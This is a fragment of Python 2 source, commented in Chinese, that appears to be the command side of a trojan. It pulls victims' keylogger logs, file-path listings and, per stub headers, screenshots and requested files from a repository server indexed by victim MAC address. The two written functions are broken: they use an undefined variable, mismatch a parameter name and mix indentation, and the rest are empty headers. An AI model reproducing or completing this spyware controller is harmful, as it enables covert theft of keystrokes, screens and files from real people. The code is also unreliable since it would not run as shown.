
'''函数名：getFileDir
函数功能：获取某台木马端的文件路径
函数参数：rep，服务器的repository对象。m，要获取的mac地址。
算法说明：'''
def getFileDir(rep):
	if repo.contents("data/"+mac+"/doc/doc.txt") == None :
    #   print "ip"
        print "dont have such file"
    con = repo.contents("data/"+mac+"/doc/doc.txt")
    msg = base64.decodestring(str(con.content))
    return msg


'''函数名：downKeyboard
函数功能：获得键盘文件数据
函数参数：
算法说明：'''
def downKeyboard(rep):
	if repo.contents("data/"+mac+"/keyboard.txt") == None :
    #   print "ip"
        print "dont have such file"
    con = repo.contents("data/"+mac+"/keyboard.txt")
    msg = base64.decodestring(str(con.content))
    return msg


函数名：downScreen
函数功能：获得截屏数据下载到本地
函数参数：
算法说明：


函数名：updateJSON
函数功能：更新配置文件
函数参数：
算法说明：

函数名：addPath
函数功能：向服务器的文件请求path/mac.txt中添加一条想获得的文件路径
函数参数：
算法说明：

函数名：delPath
函数功能：向服务器的文件请求path/mac.txt中删除一条已经获得的文件路径
函数参数：
算法说明：


函数名：ifHaveFile
函数功能：检查服务器上是否有想获得的文件，如果有就准备下载
函数参数：filename，想获得的文件的文件名
算法说明：


函数名：downFile
函数功能：从服务器下载文件
函数参数：
算法说明：
